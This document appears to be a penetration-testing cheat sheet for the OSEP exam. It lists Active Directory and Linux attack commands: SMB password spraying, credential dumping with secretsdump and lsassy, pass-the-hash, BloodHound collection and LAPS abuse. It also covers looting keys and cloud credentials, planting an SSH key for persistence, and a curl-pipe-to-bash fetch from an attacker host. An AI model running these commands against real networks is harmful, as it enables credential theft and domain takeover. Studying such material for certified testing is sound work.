# OSEP Exam Strategy — Quick Reference

> Speed and thoroughness. Every new user is a key. Every system is a pivot. Stay in the loop.

---

## The Core Loop (Repeat for Every New User/System)

```
New User → Spray SMB → mssqlpwner → BloodHound → ACL inspect → Lateral move
New System → secretsdump/lsassy → spray local admin hash → BloodHound mark owned
```

---

## Tip-by-Tip Checklist

### 1. Every New User: Spray SMB Immediately
```bash
nxc smb 192.168.X.0/24 -u newuser -p 'Password123'
# If you get hits → secretsdump and lsassy from Kali, skip the hassle of remoting in
nxc smb 192.168.X.0/24 -u newuser -p 'Password123' --sam
nxc smb TARGET -u newuser -p 'Password123' -M lsassy
```

### 2. Every New User + Every Web/Service System: mssqlpwner
```bash
# Enumerate all SQL servers the user can reach
mssqlpwner domain.com/newuser:Password@MSSQL_IP enumerate

# Also run it with machine accounts if a system hosts a web app / backend service
mssqlpwner domain.com/'WEBSRV$':@DC_IP enumerate -windows-auth
```

### 3. Every User Home Directory: Check for SSH Keys & Files
```powershell
# On every compromised Windows host:
tree /F /A C:\Users

# If user has a .ssh directory → check authorized_keys and id_rsa
# If you have their plaintext password, test SSH access:
nxc ssh 192.168.X.0/24 -u user@domain.com -p 'Password123'

# Inspect PowerShell history:
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### 4. Linux Systems: tcpdump + Post-Root Actions
```bash
# Capture traffic for credential leaks:
tcpdump -i eth0 -w /tmp/cap.pcap &

# After rooting: inject your SSH key for persistent full TTY access
echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys

# Inspect /tmp for ccache tickets, credentials:
ls -la /tmp/
find /tmp /run -name "krb5cc_*" 2>/dev/null
```

### 5. Linux PrivEsc: The Three-Step Check
```bash
sudo -l                    # sudo rights without full password
./pspy64                   # watch for cron jobs / SUID abuse opportunities
./linpeas.sh               # full automated enumeration
```

### 6. Loot Everything After Linux Root
```bash
# SSH keys (usable on other systems):
find /home /root -name "id_rsa" -o -name "*.pem" 2>/dev/null

# Ansible vault files (often contain encrypted passwords):
find / -name "vault*" -o -name "*.vault" 2>/dev/null

# AWS/cloud credentials:
find / -name "credentials" -path "*/.aws/*" 2>/dev/null
cat ~/.aws/credentials

# Keytab files for Kerberos:
find / -name "*.keytab" -o -name "krb5.keytab" 2>/dev/null
```

### 7. Every New User: Run BloodHound-CE-Python
```bash
bloodhound-python -u newuser -p 'Password123' -d corp.com -dc DC01.corp.com -c All --zip
# Upload the zip to BloodHound CE, mark the user as owned
```

### 8. Every New Domain / Privileged User: Run SharpHound
```powershell
# Run from inside the compromised context, not from Kali:
.\SharpHound.exe -s --recursedomains -c All --zipfilename output.zip
# -s = stealth mode  --recursedomains = cross all trusts
```

### 9. BloodHound Quick Wins
```bash
# Python script for automated "easy win" path detection:
# GitHub: ly4k/BloodHound / hausec/BloodHound-Custom-Queries
# Run the "Shortest Paths to DA" and "Owned Users to DA" queries first
```

### 10. Mark Everything as Owned
- In BloodHound: right-click every compromised user/host → **Mark as Owned**
- This unlocks additional pathfinding queries
- Don't skip this — it changes the attack paths shown

### 11. Inspect Owned Users' Outbound ACLs
```
For every owned user check in BloodHound:
→ Outbound Object Control (GenericAll, GenericWrite, WriteOwner, WriteDACL, etc.)
→ Local Admin Rights (Find Principals with DA Privs)
→ Group Memberships → then check the groups' outbound ACLs too
→ Can RDP / CanPSRemote / ExecuteDCOM rights
```

### 12. NTLM Hash → Plaintext Lookup
```
For every NTLMv2 or NTLM hash you capture:
1. Try: https://ntlm.pw   (rainbow table lookup)
2. If plaintext found → spray against SSH targets
3. hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt --force
```

### 13. Background Nmap While Working
```bash
# Start a full port scan in background once you have subnet knowledge:
nmap -sV -p- 192.168.X.0/24 -oA /tmp/full_scan --min-rate 2000 &

# Review when you've exhausted AD quick wins — new ports = new attack surface
```

### 14. BloodyAD: What Can This User Write To?
```bash
# For every new user, check writable AD objects:
bloodyAD --dc-host DC01.corp.com -u newuser -p 'Password123' get writable

# If BloodHound already shows this, skip — but useful for double-checking
```

### 15. LAPS Password Spray
```bash
# If any user has LAPS Reader membership OR you want to spray:
nxc smb 192.168.X.0/24 -u newuser -p 'Password123' --laps

# LAPS passwords are the local Administrator passwords — use to laterally move
nxc smb TARGET -u Administrator -p 'LAPSpassword' --local-auth
```

### 16. Stuck? Full Reset Checklist
```
□ All compromised users marked as Owned in BloodHound
□ bloodhound-ce-python run for every user
□ SharpHound run from every major system
□ BloodHound Quick Wins script run
□ tree /F /A in C:\Users on every Windows system
□ Non-default folders in C:\ inspected
□ Nmap scan review for overlooked services
□ MSSQL servers enumerated with mssqlpwner
□ NTLM hashes checked against ntlm.pw
```

### 17. Every System You Compromise: Extract + Spray Local Admin Hash
```bash
# Extract local admin hash:
nxc smb TARGET -u user -p 'Pass' --sam
# OR:
impacket-secretsdump corp.com/user:pass@TARGET

# Spray the local Administrator hash across the subnet (pass-the-hash):
nxc smb 192.168.X.0/24 -u Administrator -H <NTLM_HASH> --local-auth

# Look for same-hash machines (common in AD environments with image reuse)
```

---

## Exam Priority Order

```
1. Initial shell → run host-triage.ps1 / linpeas.sh
2. Dump creds immediately (secretsdump, lsassy, DPAPI)
3. Spray every new cred across subnet
4. Run BloodHound on every new user
5. Follow BloodHound paths to DA
6. When stuck → check MSSQL, ADCS, Delegation, LAPS
7. Pivot via SQL linked servers, DCOM, WMI
```

---

## Key Tool Locations

| Tool | Command |
|------|---------|
| BloodHound-CE Python | `bloodhound-python -u u -p p -d d -dc DC -c All --zip` |
| SharpHound | `.\SharpHound.exe -s --recursedomains -c All` |
| mssqlpwner | `mssqlpwner domain/user:pass@IP enumerate` |
| bloodyAD | `bloodyAD --dc-host DC -u u -p p get writable` |
| nxc SSH spray | `nxc ssh 0/24 -u user -p pass` |
| nxc LAPS | `nxc smb 0/24 -u u -p p --laps` |
| NTLM lookup | `https://ntlm.pw` |
| pspy64 | `./pspy64 2>/dev/null` |
| linpeas | `curl http://KALI/linpeas.sh \| bash` |
